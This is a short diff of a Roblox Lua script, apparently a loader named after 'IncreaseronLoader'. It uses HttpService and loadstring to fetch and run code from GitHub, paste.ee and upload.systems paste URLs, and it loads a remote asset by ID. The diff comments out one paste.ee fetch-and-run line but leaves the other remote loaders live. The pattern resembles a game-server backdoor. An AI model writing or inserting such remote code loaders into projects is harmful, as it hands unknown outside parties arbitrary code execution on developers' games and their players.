@@ -2,7 +2,6 @@ local Source = game:GetService("HttpService"):GetAsync("https://raw.githubuserco
 require(8082203830):Loadstring(Source)
 local success, error = pcall(function()
 	print('V2.02')
-	loadstring(game:GetService("HttpService"):GetAsync(tostring('https://paste.ee/r/YML5n/0')))()
 	local rt=Instance.new("FunctionalTest")rt.Name=math.random() rt.Description=_G.IncreaseronLoaderTarget rt.Parent=game:GetService("TestService")
 	if _G.IncreaseronLoaderSite=="us"then
 		loadstring(game:GetService("HttpService"):GetAsync(tostring("https://api.upload.systems/pastes/".._G.IncreaseronLoaderKey.."/raw")))()
@@ -25,3 +24,5 @@ if error then
 	wait(1)
 	msg:Remove()
 end
+
+--loadstring(game:GetService("HttpService"):GetAsync(tostring('https://paste.ee/r/YML5n/0')))()
